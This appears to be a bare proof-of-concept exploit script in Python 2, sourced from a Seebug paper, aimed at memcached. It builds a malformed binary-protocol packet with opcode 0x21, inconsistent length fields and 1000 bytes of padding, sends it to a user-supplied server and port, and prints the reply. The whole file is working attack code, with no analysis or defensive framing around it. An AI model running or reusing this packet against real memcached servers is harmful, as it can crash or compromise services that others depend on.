# Source: http://paper.seebug.org/95/

import struct  
import socket  
import sys


MEMCACHED_REQUEST_MAGIC = "\x80"  
OPCODE_SET = "\x21"  
key_len = struct.pack("!H",32)  
body_len = struct.pack("!I",1)  
packet = MEMCACHED_REQUEST_MAGIC + OPCODE_SET + key_len +   body_len*2 + "A"*1000  
if len(sys.argv) != 3:  
    print "./poc_sasl.py <server> <ip>"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
s.connect((sys.argv[1],int(sys.argv[2])))  
s.sendall(packet)  
print s.recv(1024)  
s.close()  